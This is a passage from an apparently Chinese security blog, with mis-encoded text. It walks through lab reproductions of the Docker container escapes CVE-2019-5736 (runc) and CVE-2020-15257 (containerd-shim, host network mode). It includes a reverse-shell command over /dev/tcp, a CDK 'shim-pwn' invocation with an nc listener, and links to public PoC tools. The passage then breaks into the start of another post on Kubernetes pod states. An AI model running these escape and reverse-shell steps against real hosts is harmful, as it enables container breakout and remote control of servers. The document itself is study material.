/bin/bash</code>ï¼Œ</p><h6 id="2-5åˆ©ç”¨è¿‡ç¨‹"><a href="#2-5åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="2.5åˆ©ç”¨è¿‡ç¨‹"></a>2.5åˆ©ç”¨è¿‡ç¨‹</h6><p>ç„¶åçš„åˆ©ç”¨æµç¨‹æ˜¯ï¼Œæ‹‰å»ä¸€ä¸ªUbuntuçš„é•œåƒï¼Œé»˜è®¤metargetå¸®æˆ‘ä»¬æ‹‰å¥½äº†ï¼Œ<br>ç„¶åÂ·<code>docker run -it ubuntu /bin/bash</code>èµ·ä¸€ä¸ªé•œåƒï¼Œ<br>å¦èµ·ä¸€ä¸ªç»ˆç«¯ï¼Œ<code>docker ps</code>,çœ‹ä¸€ä¸‹containerid<br>è¿™é‡Œèµ·å®¹å™¨çš„æ—¶å€™æ³¨æ„ï¼Œè¦åŠ -itï¼Œå¦‚æœæƒ³åå°è¿è¡Œçš„è¯ï¼Œä¹Ÿè¦åŠ -dï¼Œä¸ç„¶exitåä¼šé€€å‡ºæ¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-d: åå°è¿è¡Œå®¹å™¨ï¼Œå¹¶è¿”å›å®¹å™¨IDï¼›</span><br><span class="line">-i: ä»¥äº¤äº’æ¨¡å¼è¿è¡Œå®¹å™¨ï¼Œé€šå¸¸ä¸ -t åŒæ—¶ä½¿ç”¨ï¼›</span><br><span class="line">-t: ä¸ºå®¹å™¨é‡æ–°åˆ†é…ä¸€ä¸ªä¼ªè¾“å…¥ç»ˆç«¯ï¼Œé€šå¸¸ä¸ -i åŒæ—¶ä½¿ç”¨ï¼›</span><br></pre></td></tr></table></figure><p><img src="/images/k8s/image-20240115153503004.png" alt="image-20240115153503004"></p><p>å»è¿™é‡Œä¸‹è½½ä¸€ä¸‹poc,ç”¨goç¼–è¯‘ï¼Œæ³¨æ„è¿™é‡Œè¿™ä¸ªpocä¸éœ€è¦å°†payloadæ”¾åœ¨æ–‡ä»¶ä¸­ï¼Œåˆ©ç”¨çš„æ—¶å€™ç›´æ¥ç»ˆç«¯ä¸­è·å–ã€‚</p><p><code>https://github.com/Frichetten/CVE-2019-5736-PoC/blob/master/main.go</code></p><p>æ¨¡æ‹Ÿè·å–åˆ°å®¹å™¨çš„æƒé™ï¼Œç„¶åä¸Šä¼ pocã€‚</p><p><code>docker cp cve-2019-5736 7a6c5438f435:/</code></p><p>åŠ ä¸€ä¸ªæƒé™ï¼Œç„¶åæ‰§è¡Œè¦æ‰§è¡Œçš„å‘½ä»¤å°±å¯</p><p><code>./cve-2019-5736 -shell &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2233 0&gt;&amp;1&quot;</code></p><p><img src="/images/k8s/image-20240115171916605.png" alt="image-20240115171916605"></p><p><img src="/images/k8s/image-20240115171940936.png" alt="image-20240115171940936"></p><p><img src="/images/k8s/image-20240115172023103.png" alt="image-20240115172023103"></p><p>åŒæ—¶vpsç›‘å¬ï¼Œè¿™é‡Œä¸€å®šè¦æ³¨æ„ï¼Œç¬”è€…åœ¨ç¬¬ä¸€æ¬¡æµ‹è¯•çš„æ—¶å€™è¾“é”™äº†å‘½ä»¤ï¼Œç„¶åï¼Œå†å»æƒ³æ‰§è¡Œå…¶ä»–å‘½ä»¤çš„æ—¶å€™ï¼Œä¼šæŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯ï¼Œå¯èƒ½docker-runcè¿™ä¸ªç»„ä»¶è¢«æ‰“å´©äº†ã€‚</p><p>æ‰§è¡Œ<code>tail -c 100 /usr/bin/docker-runc | xxd</code>å¯ä»¥çœ‹åˆ°ï¼Œruncè¢«æ›´æ”¹äº†ã€‚</p><p><img src="/images/k8s/image-20240115172218627.png" alt="image-20240115172218627"></p><p>runcå´©äº†ï¼Œå°±è¿›ä¸å»å®¹å™¨äº†</p><p><img src="/images/k8s/image-20240112160934960.png" alt="image-20240112160934960"></p><h6 id="2-6æ€»ç»“"><a href="#2-6æ€»ç»“" class="headerlink" title="2.6æ€»ç»“"></a>2.6æ€»ç»“</h6><p>æ¼æ´çš„å®ç°éš¾ç‚¹åœ¨äºï¼Œéœ€è¦åœ¨å®¿ä¸»ä¸»æœºä¸Šæ‰§è¡Œä¸€ä¸‹è¿›å…¥å¯æ§å®¹å™¨çš„æ­¥éª¤ï¼Œè¿™ä¸€æ­¥å®ç°èµ·æ¥ç›¸å¯¹æ¯”è¾ƒéš¾ã€‚<br>è¿˜æœ‰å°±æ˜¯ï¼Œå®æˆ˜ä¸­å¦‚æœçœŸçš„æ¡ä»¶å…è®¸çš„è¯ï¼Œruncä¼šè¢«æ›´æ”¹ï¼Œå¯èƒ½ä¼šå½±å“ä¸šåŠ¡ï¼Œè¿™æ˜¯å¾ˆéš¾å—çš„ã€‚</p><h5 id="3-CVE-2020-15257-hostæ¨¡å¼å®¹å™¨é€ƒé€¸æ¼æ´"><a href="#3-CVE-2020-15257-hostæ¨¡å¼å®¹å™¨é€ƒé€¸æ¼æ´" class="headerlink" title="3.CVE-2020-15257-hostæ¨¡å¼å®¹å™¨é€ƒé€¸æ¼æ´"></a>3.CVE-2020-15257-hostæ¨¡å¼å®¹å™¨é€ƒé€¸æ¼æ´</h5><h6 id="3-1å‰ç½®çŸ¥è¯†ï¼šdockerç½‘ç»œ-Dockeré…ç½®ä¸å½“å¯¼è‡´çš„å®¹å™¨é€ƒé€¸"><a href="#3-1å‰ç½®çŸ¥è¯†ï¼šdockerç½‘ç»œ-Dockeré…ç½®ä¸å½“å¯¼è‡´çš„å®¹å™¨é€ƒé€¸" class="headerlink" title="3.1å‰ç½®çŸ¥è¯†ï¼šdockerç½‘ç»œ,Dockeré…ç½®ä¸å½“å¯¼è‡´çš„å®¹å™¨é€ƒé€¸"></a>3.1å‰ç½®çŸ¥è¯†ï¼šdockerç½‘ç»œ,Dockeré…ç½®ä¸å½“å¯¼è‡´çš„å®¹å™¨é€ƒé€¸</h6><p>è¿™é‡Œæˆ‘ä»¬å†æ¬¡æåˆ°NameSpaceå’Œcgroups</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Linux å‘½åç©ºé—´ï¼ˆNameSpaceï¼‰ï¼šå®ç°æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œã€è¿›ç¨‹ã€ä¸»æœºåç­‰æ–¹é¢çš„éš”ç¦»</span><br><span class="line">Linux æ§åˆ¶ç»„ï¼ˆcgroupsï¼‰ï¼šå®ç° CPUã€å†…å­˜ã€ç¡¬ç›˜ç­‰æ–¹é¢çš„éš”ç¦»</span><br></pre></td></tr></table></figure><p>å¦‚æœè®¾å®šäº†ä»¥ä¸‹é…ç½®å°±ä¼šå¯¼è‡´ç›¸åº”çš„éš”ç¦»æœºåˆ¶å¤±æ•ˆï¼š</p><p>å…¶å®åŸç†å¾ˆç®€å•,å°±æ˜¯é€šè¿‡æƒé™çš„å˜æ›´æ‰“ç ´äº†åŸæ¥çš„æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œã€è¿›ç¨‹ã€ä¸»æœºåç­‰æ–¹é¢çš„éš”ç¦»</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--privilegedï¼šä½¿å®¹å™¨å†…çš„ root æƒé™å’Œå®¿ä¸»æœºä¸Šçš„ root æƒé™ä¸€è‡´ï¼Œæƒé™éš”ç¦»è¢«æ‰“ç ´</span><br><span class="line"></span><br><span class="line">--net=hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€ç½‘ç»œå‘½åç©ºé—´ï¼Œç½‘ç»œéš”ç¦»è¢«æ‰“ç ´</span><br><span class="line"></span><br><span class="line">--pid=hostï¼šä½¿å®¹å™¨ä¸å®¿ä¸»æœºå¤„äºåŒä¸€è¿›ç¨‹å‘½ä»¤ç©ºé—´ï¼Œè¿›ç¨‹éš”ç¦»è¢«æ‰“ç ´</span><br><span class="line"></span><br><span class="line">--volume /:/hostï¼šå®¿ä¸»æœºæ ¹ç›®å½•è¢«æŒ‚è½½åˆ°å®¹å™¨å†…éƒ¨ï¼Œæ–‡ä»¶ç³»ç»Ÿéš”ç¦»è¢«æ‰“ç ´</span><br></pre></td></tr></table></figure><p>å½“ä½ å®‰è£…å®ŒDockeræ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨åˆ›å»ºä¸‰ä¸ªç½‘ç»œã€‚ä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹<code>docker network ls</code>å‘½ä»¤åˆ—å‡ºè¿™äº›ç½‘ç»œï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker network ls</span><br></pre></td></tr></table></figure><p>ç»“æœåº”å¦‚ä¸‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">NETWORK ID          NAME                       DRIVER              <span class="keyword">SCOPE</span></span><br><span class="line"><span class="number">92</span>d50b6667c7        bridge                     bridge              <span class="keyword">local</span></span><br><span class="line"><span class="number">01</span>f9f326e362        host                       host                <span class="keyword">local</span></span><br><span class="line"><span class="number">1</span>b3137177ee1        <span class="keyword">none</span>                       <span class="keyword">null</span>                <span class="keyword">local</span></span><br><span class="line">f646c93ba617        unauthorized<span class="operator">-</span>rce_default   bridge              <span class="keyword">local</span></span><br></pre></td></tr></table></figure><p>Dockerå†…ç½®è¿™ä¸‰ä¸ªç½‘ç»œï¼Œè¿è¡Œå®¹å™¨æ—¶ï¼Œä½ å¯ä»¥ä½¿ç”¨è¯¥æ¥æŒ‡å®šå®¹å™¨åº”è¿æ¥åˆ°å“ªäº›ç½‘ç»œã€‚</p><p>æˆ‘ä»¬åœ¨ä½¿ç”¨docker runåˆ›å»ºDockerå®¹å™¨æ—¶ï¼Œå¯ä»¥ç”¨<code>--network</code>æ ‡å¿— é€‰é¡¹æŒ‡å®šå®¹å™¨çš„ç½‘ç»œæ¨¡å¼ï¼ŒDockeræœ‰ä»¥ä¸‹4ç§ç½‘ç»œæ¨¡å¼ï¼š<br>hostæ¨¡å¼ï¼šä½¿ç”¨ â€“net=host æŒ‡å®šã€‚<br>noneæ¨¡å¼ï¼šä½¿ç”¨ â€“net=none æŒ‡å®šã€‚<br>bridgeæ¨¡å¼ï¼šä½¿ç”¨ â€“net=bridge æŒ‡å®šï¼Œé»˜è®¤è®¾ç½®ã€‚<br>containeræ¨¡å¼ï¼šä½¿ç”¨ â€“net=container:NAME_or_ID æŒ‡å®šã€‚</p><p>Dockerä½¿ç”¨äº†Linuxçš„NamespacesæŠ€æœ¯æ¥è¿›è¡Œèµ„æºéš”ç¦»ï¼Œå¦‚PID Namespaceéš”ç¦»è¿›ç¨‹ï¼ŒMount Namespaceéš”ç¦»æ–‡ä»¶ç³»ç»Ÿï¼ŒNetwork Namespaceéš”ç¦»ç½‘ç»œç­‰ã€‚ä¸€ä¸ªNetwork Namespaceæä¾›äº†ä¸€ä»½ç‹¬ç«‹çš„ç½‘ç»œç¯å¢ƒï¼ŒåŒ…æ‹¬ç½‘å¡ã€è·¯ç”±ã€Iptableè§„åˆ™ç­‰éƒ½ä¸å…¶ä»–çš„Network Namespaceéš”ç¦»ã€‚</p><p>hostæ¨¡å¼ç±»ä¼¼äºVmwareçš„æ¡¥æ¥æ¨¡å¼ï¼Œä¸å®¿ä¸»æœºåœ¨åŒä¸€ä¸ªç½‘ç»œä¸­ï¼Œä½†æ²¡æœ‰ç‹¬ç«‹IPåœ°å€ã€‚ä¸€ä¸ªDockerå®¹å™¨ä¸€èˆ¬ä¼šåˆ†é…ä¸€ä¸ªç‹¬ç«‹çš„Network Namespaceã€‚ä½†å¦‚æœå¯åŠ¨å®¹å™¨çš„æ—¶å€™ä½¿ç”¨hostæ¨¡å¼ï¼Œé‚£ä¹ˆè¿™ä¸ªå®¹å™¨å°†ä¸ä¼šè·å¾—ä¸€ä¸ªç‹¬ç«‹çš„Network Namespaceï¼Œè€Œæ˜¯å’Œå®¿ä¸»æœºå…±ç”¨ä¸€ä¸ªNetwork Namespaceã€‚å®¹å™¨å°†ä¸ä¼šè™šæ‹Ÿå‡ºè‡ªå·±çš„ç½‘å¡ï¼Œé…ç½®è‡ªå·±çš„IPç­‰ï¼Œè€Œæ˜¯ä½¿ç”¨å®¿ä¸»æœºçš„IPå’Œç«¯å£ã€‚</p><p>å®¹å™¨ä¸ä¸»æœºåœ¨ç›¸åŒçš„ç½‘ç»œå‘½åç©ºé—´ä¸‹é¢ï¼Œä½¿ç”¨ç›¸åŒçš„ç½‘ç»œåè®®æ ˆï¼Œå®¹å™¨å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸»æœºçš„æ‰€æœ‰ç½‘ç»œæ¥å£ã€‚</p><h6 id="3-2containerd-shim"><a href="#3-2containerd-shim" class="headerlink" title="3.2containerd-shim"></a>3.2containerd-shim</h6><p>åœ¨è¿›ä¸€æ­¥äº†è§£æ¼æ´åŸç†ä¹‹å‰ï¼Œ æˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸‹å•Š <strong>containerd-shim</strong> æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>åœ¨ 1.11 ç‰ˆæœ¬ä¸­ï¼ŒDocker è¿›è¡Œäº†é‡å¤§çš„é‡æ„ï¼Œç”±å•ä¸€çš„ Docker Daemonï¼Œæ‹†åˆ†æˆäº† 4 ä¸ªç‹¬ç«‹çš„æ¨¡å—ï¼šDocker Daemonã€containerdã€containerd-shimã€runC</p><p>å…¶ä¸­ï¼Œcontainerd æ˜¯ç”± Docker Daemon ä¸­çš„å®¹å™¨è¿è¡Œæ—¶åŠå…¶ç®¡ç†åŠŸèƒ½å‰¥ç¦»äº†å‡ºæ¥ã€‚docker å¯¹å®¹å™¨çš„ç®¡ç†å’Œæ“ä½œåŸºæœ¬éƒ½æ˜¯é€šè¿‡ containerd å®Œæˆçš„ã€‚containerdå°±æ˜¯dockerå‰é¢çš„é‚£ä¸ªå·ã€‚</p><p><img src="/images/k8s/image-20240117094901172.png" alt="image-20240117094901172"></p><p>å®ƒå‘ä¸Šä¸º Docker Daemon æä¾›äº† gRPC æ¥å£ï¼Œå‘ä¸‹é€šè¿‡ containerd-shim ç»“åˆ runCï¼Œå®ç°å¯¹å®¹å™¨çš„ç®¡ç†æ§åˆ¶ã€‚containerd è¿˜æä¾›äº†å¯ç”¨äºä¸å…¶äº¤äº’çš„ API å’Œå®¢æˆ·ç«¯åº”ç”¨ç¨‹åº ctrã€‚æ‰€ä»¥å®é™…ä¸Šï¼Œå³ä½¿ä¸è¿è¡Œ Docker Daemonï¼Œä¹Ÿèƒ½å¤Ÿç›´æ¥é€šè¿‡ containerd æ¥è¿è¡Œã€ç®¡ç†å®¹å™¨ã€‚</p><p>è€Œä¸­é—´çš„ <strong>containerd-shim</strong> å¤¹æ‚åœ¨ containerd å’Œ runc ä¹‹é—´ï¼Œæ¯æ¬¡å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ containerd-shim è¿›ç¨‹ï¼Œå®ƒé€šè¿‡æŒ‡å®šçš„ä¸‰ä¸ªå‚æ•°ï¼šå®¹å™¨ idã€bundle ç›®å½•ã€è¿è¡Œæ—¶äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ï¼Œæ¥è°ƒç”¨è¿è¡Œæ—¶çš„ API åˆ›å»ºã€è¿è¡Œå®¹å™¨ï¼ŒæŒç»­å­˜åœ¨åˆ°å®¹å™¨å®ä¾‹è¿›ç¨‹é€€å‡ºä¸ºæ­¢ï¼Œå°†å®¹å™¨çš„é€€å‡ºçŠ¶æ€åé¦ˆç»™ containerdã€‚</p><h6 id="3-3æ¼æ´åŸç†"><a href="#3-3æ¼æ´åŸç†" class="headerlink" title="3.3æ¼æ´åŸç†"></a>3.3æ¼æ´åŸç†</h6><p>ç”±äºåœ¨ host æ¨¡å¼ä¸‹ï¼Œå®¹å™¨ä¸ <strong>host</strong> å…±äº«ä¸€å¥— <strong>Network namespaces</strong> ï¼Œæ­¤æ—¶ <strong>containerd-shim API</strong> æš´éœ²ç»™äº†ç”¨æˆ·ï¼Œè€Œä¸”è®¿é—®æ§åˆ¶ä»…ä»…éªŒè¯äº†è¿æ¥è¿›ç¨‹çš„æœ‰æ•ˆUIDä¸º0ï¼Œä½†æ²¡æœ‰é™åˆ¶å¯¹æŠ½è±¡UnixåŸŸå¥—æ¥å­—çš„è®¿é—®ã€‚æ‰€ä»¥å½“ä¸€ä¸ªå®¹å™¨ä¸º root æƒé™ï¼Œä¸”å®¹å™¨çš„ç½‘ç»œæ¨¡å¼ä¸º <code>--net=host</code> çš„æ—¶å€™ï¼Œé€šè¿‡ <strong>ontainerd-shim API</strong> å¯ä»¥è¾¾æˆå®¹å™¨é€ƒé€¸çš„ç›®çš„</p><h6 id="3-4æ¼æ´å½±å“ç‰ˆæœ¬"><a href="#3-4æ¼æ´å½±å“ç‰ˆæœ¬" class="headerlink" title="3.4æ¼æ´å½±å“ç‰ˆæœ¬"></a>3.4æ¼æ´å½±å“ç‰ˆæœ¬</h6><p>è¯¥æ¼æ´å½±å“ containerd 1.3.x, 1.2.x, 1.4.x ç‰ˆæœ¬</p><h6 id="3-5ç¯å¢ƒæ­å»º"><a href="#3-5ç¯å¢ƒæ­å»º" class="headerlink" title="3.5ç¯å¢ƒæ­å»º"></a>3.5ç¯å¢ƒæ­å»º</h6><p>./metarget cnv install cve-2020-15257</p><p>metargetå®ç°çš„å‘½ä»¤æ˜¯<br>sudo docker run -it â€“net=host â€“name=15257 ubuntu /bin/bash</p><p>æˆ‘ä»¬ç”¨<br>docker run -d -it â€“net=host vulhub/thinkphp:5.0.23ï¼Œèµ·ä¸€ä¸ªå¸¦æ¼æ´çš„ä¹Ÿå¯ä»¥</p><p>./metarget cnv install cve-2020-15257</p><p><img src="/images/k8s/image-20240117104127925.png" alt="image-20240117104127925"></p><p><img src="/images/k8s/image-20240117104149458.png" alt="image-20240117104149458"></p><p>è¿™æ ·å°±å¯ä»¥æ¨¡æ‹Ÿæ¼æ´åˆ©ç”¨ç„¶åæ‹¿rootï¼Œç„¶åé€ƒé€¸äº†</p><h6 id="3-6æ¼æ´åˆ©ç”¨"><a href="#3-6æ¼æ´åˆ©ç”¨" class="headerlink" title="3.6æ¼æ´åˆ©ç”¨"></a>3.6æ¼æ´åˆ©ç”¨</h6><p>webshellä¸­ä¹Ÿæ˜¯å¯åˆ¤æ–­æ˜¯å¦å­˜åœ¨æŠ½è±¡å‘½åç©ºé—´unixåŸŸå¥—æ¥å­—ã€‚<br><code>cat /proc/net/unix|grep -a &quot;containerd-shim&quot;</code><br>å‡ºç°ä¸‹å›¾ä¸­çš„ä¿¡æ¯ï¼Œè¡¨ç¤ºå­˜åœ¨æŠ½è±¡å‘½åç©ºé—´unixåŸŸå¥—æ¥å­—ã€‚</p><p><img src="/images/k8s/image-20240117144206246.png" alt="image-20240117144206246"></p><p>ä»å®¿ä¸»ä¸»æœºè¿›å…¥åˆ°å®¹å™¨ä¸­</p><p><img src="/images/k8s/image-20240117104701059.png" alt="image-20240117104701059"></p><p>å»åˆ°è¿™é‡Œä¸‹è½½ä¸€ä¸‹å¤§å¸ˆå‚…çš„å·¥å…·ï¼Œ<a href="https://github.com/cdk-team/CDK/tree/0.1.6%EF%BC%8C%E6%88%91%E8%BF%99%E9%87%8C%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%98%AF%E6%9C%80%E8%80%81%E7%89%88%E6%9C%AC0.1.6%E7%9A%84%EF%BC%8C%E7%94%A8%E6%9C%80%E6%96%B0%E7%89%88%E7%9A%84%E6%8A%A5%E9%94%99%E3%80%82">https://github.com/cdk-team/CDK/tree/0.1.6ï¼Œæˆ‘è¿™é‡Œä¸‹è½½çš„æ˜¯æœ€è€ç‰ˆæœ¬0.1.6çš„ï¼Œç”¨æœ€æ–°ç‰ˆçš„æŠ¥é”™ã€‚</a><br>ç„¶åå…ˆè¯•ä¸‹å¦‚æœæ˜¯webshellçš„è¯å¯ä¸å¯ä»¥ï¼Œè¿™é‡Œç»è¿‡æµ‹è¯•å¥½åƒæ˜¯ä¸å¯ä»¥çš„ï¼Œä¼šæŠ¥rpc error: ttrpc: closed<br>å¯èƒ½æ˜¯æƒé™é—®é¢˜ï¼Œä¸å¤ªæ¸…æ¥šã€‚</p><p><img src="/images/k8s/image-20240117143535014.png" alt="image-20240117143535014"></p><p>å›åˆ°å®¿ä¸»ä¸»æœºï¼Œå°†cdk_linux_amd64åŒæ ·ä¼ åˆ°å®¹å™¨ä¸­ï¼Œ<code>docker cp cdk_linux_amd64 ubuntu:18.04:/</code><br>ç„¶ååŠ ä¸Šæƒé™æ‰§è¡Œï¼Œ./cdk_linux_amd64 run shim-pwn ip 23333</p><p>nc -lvvnp 23333 ç›‘å¬å³å¯ã€‚<img src="/images/k8s/image-20240117144000362.png" alt="image-20240117144000362"></p><p><img src="/images/k8s/image-20240117144044795.png" alt="image-20240117144044795"></p><h6 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h6><p>è¿™ä¸ªæ¼æ´è¦ç¬¦åˆä¸‰ä¸ªæ¡ä»¶ï¼Œä¸€ä¸ªå°±æ˜¯containerdç‰ˆæœ¬ï¼Œå†å°±æ˜¯æƒé™çš„é—®é¢˜ï¼Œå¯èƒ½ä¸å¿…é¡»è¦rootï¼Œç¬”è€…æµ‹è¯•çš„è¯ ã€‚webshellçš„æƒé™ç¡®å®æ²¡æˆåŠŸã€‚æœ€åä¸€ä¸ªï¼Œå°±æ˜¯dockerå®¹å™¨ç¯å¢ƒèµ·æ¥çš„æ—¶å€™è¦hostæ¨¡å¼ã€‚</p><h5 id="è‡´è°¢"><a href="#è‡´è°¢" class="headerlink" title="è‡´è°¢"></a>è‡´è°¢</h5><p>æœ€åæ„Ÿè°¢æ‚¨è¯»åˆ°ç°åœ¨ï¼Œè¿™ç¯‡æ–‡ç« åŒ†å¿™æ„æˆè‚¯å®šæœ‰é”™è¯¯åˆ°æˆ–æè¿°ä¸æ­£ç¡®çš„åœ°æ–¹ï¼ŒæœŸå¾…ä¸šç•Œå¸ˆå‚…ä»¬æŒ‡æ­£å‹˜è¯¯ã€‚æœ¬æ¥æ˜¯ç ”ç©¶k8sæ¼æ´çš„ï¼Œå¥ˆä½•ç¬”è€…èƒ½åŠ›æœ‰é™ï¼Œåªç ”ç©¶äº†k8sçš„æœªæˆæƒç®€å•çš„æ¼æ´ã€‚åç»­å¦‚æœæœ‰æœºä¼šçš„è¯ï¼Œåœ¨ç ”ç©¶å…¶ä»–æ¼æ´å§ã€‚</p><h5 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h5><pre><code>https://bestwing.me/CVE-2020-15257-anaylysis.html  CVE-2020-15257 Docker é€ƒé€¸æ¼æ´åˆ†æ``https://blog.csdn.net/w17791476027/article/details/132637785https://github.com/cdk-team/CDK/tree/0.1.6 å·¥å…·https://xz.aliyun.com/t/8925?time__1311=n4%2BxuDgDBD90i%3DD7YD8DlP6e0%3D25Zg2iE%2B%2BbD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-5https://www.mylovekiki.top/?p=1033https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Docker/Docker%20%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20%28CVE-2020-15257%29%E5%A4%8D%E7%8E%B0/https://www.cnblogs.com/tomyyyyy/p/16275873.html#tid-mkZRymhttps://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Docker/Docker%20%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20%28CVE-2020-15257%29%E5%A4%8D%E7%8E%B0/https://blog.csdn.net/qq_36197704/article/details/122172877https://m01ly.github.io/2022/01/04/pt-docker-escape/</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>k8så­¦ä¹ åŠæ¼æ´å¤ç°-ä¸Š</title>
      <link href="/2023/12/25/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8A/"/>
      <url>/2023/12/25/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/k8s%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E4%B8%8A/</url>
      
        <content type="html"><![CDATA[<h4 id="k8såŸºç¡€çŸ¥è¯†"><a href="#k8såŸºç¡€çŸ¥è¯†" class="headerlink" title="k8såŸºç¡€çŸ¥è¯†"></a>k8såŸºç¡€çŸ¥è¯†</h4><h5 id="å¸¸è§çš„podçŠ¶æ€"><a href="#å¸¸è§çš„podçŠ¶æ€" class="headerlink" title="å¸¸è§çš„podçŠ¶æ€"></a>å¸¸è§çš„podçŠ¶æ€</h5><p><img src="https://pic3.zhimg.com/80/v2-9eb57d02d5fe3b5d16b84e05c60eb6de_720w.webp" alt="img"></p><p>pod</p><p><strong>podå¸¸è§çš„çŠ¶æ€</strong>ï¼š<br><strong>ç¬¬ä¸€é˜¶æ®µ</strong>ï¼š<br><strong>æŒ‚èµ·ï¼ˆPendingï¼‰</strong>ï¼š<br>1ã€æ­£åœ¨åˆ›å»ºPodä½†æ˜¯Podä¸­çš„å®¹å™¨è¿˜æ²¡æœ‰å…¨éƒ¨è¢«åˆ›å»ºå®Œæˆï¼Œå¤„äºæ­¤çŠ¶æ€çš„Podåº”è¯¥æ£€æŸ¥Podä¾èµ–çš„å­˜å‚¨æ˜¯å¦æœ‰æƒé™æŒ‚è½½ã€é•œåƒæ˜¯å¦å¯ä»¥ä¸‹è½½ã€è°ƒåº¦æ˜¯å¦æ­£å¸¸ç­‰<br>2ã€æˆ‘ä»¬åœ¨è¯·æ±‚åˆ›å»ºpodæ—¶ï¼Œæ¡ä»¶ä¸æ»¡è¶³ï¼Œè°ƒåº¦æ²¡æœ‰å®Œæˆï¼Œæ²¡æœ‰ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹èƒ½æ»¡è¶³è°ƒåº¦æ¡ä»¶ï¼Œå·²ç»åˆ›å»ºäº†podä½†æ˜¯æ²¡æœ‰é€‚åˆå®ƒè¿è¡Œçš„èŠ‚ç‚¹å«åšæŒ‚èµ·ï¼Œè°ƒåº¦æ²¡æœ‰å®Œæˆã€‚</p><p><strong>å¤±è´¥ï¼ˆFailedï¼‰</strong>ï¼šPod ä¸­çš„æ‰€æœ‰å®¹å™¨éƒ½å·²ç»ˆæ­¢äº†ï¼Œå¹¶ä¸”è‡³å°‘æœ‰ä¸€ä¸ªå®¹å™¨æ˜¯å› ä¸ºå¤±è´¥ç»ˆæ­¢ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®¹å™¨ä»¥é0çŠ¶æ€é€€å‡ºæˆ–è€…è¢«ç³»ç»Ÿç»ˆæ­¢ã€‚<br><strong>æœªçŸ¥ï¼ˆUnknownï¼‰</strong>ï¼šæœªçŸ¥çŠ¶æ€ï¼Œæ‰€è°“podæ˜¯ä»€ä¹ˆçŠ¶æ€æ˜¯apiserverå’Œè¿è¡Œåœ¨podèŠ‚ç‚¹çš„kubeletè¿›è¡Œé€šä¿¡è·å–çŠ¶æ€ä¿¡æ¯çš„ï¼Œå¦‚æœèŠ‚ç‚¹ä¹‹ä¸Šçš„kubeletæœ¬èº«å‡ºæ•…éšœï¼Œé‚£ä¹ˆapiserverå°±è¿ä¸ä¸Škubeletï¼Œå¾—ä¸åˆ°ä¿¡æ¯äº†ï¼Œå°±ä¼šçœ‹Unknownï¼Œé€šå¸¸æ˜¯ç”±äºä¸podæ‰€åœ¨çš„nodeèŠ‚ç‚¹é€šä¿¡é”™è¯¯ã€‚</p><p><strong>Error çŠ¶æ€</strong>ï¼šPod å¯åŠ¨è¿‡ç¨‹ä¸­å‘ç”Ÿäº†é”™è¯¯</p><p><strong>æˆåŠŸï¼ˆSucceededï¼‰</strong>ï¼šPodä¸­çš„æ‰€æœ‰å®¹å™¨éƒ½è¢«æˆåŠŸç»ˆæ­¢ï¼Œå³podé‡Œæ‰€æœ‰çš„containerså‡å·²terminatedã€‚</p><p><strong>å·²ç»ˆæ­¢ï¼ˆTerminatedï¼‰</strong> å¤„äºTerminatedçŠ¶æ€çš„å®¹å™¨å·²ç»å¼€å§‹æ‰§è¡Œå¹¶ä¸”æˆ–è€…æ­£å¸¸ç»“æŸæˆ–è€…å› ä¸ºæŸäº›åŸå› å¤±è´¥ã€‚ å¦‚æœä½ ä½¿ç”¨kubectlæ¥æŸ¥è¯¢åŒ…å«TerminatedçŠ¶æ€çš„å®¹å™¨çš„ Pod æ—¶ï¼Œ ä½ ä¼šçœ‹åˆ°å®¹å™¨è¿›å…¥æ­¤çŠ¶æ€çš„åŸå› 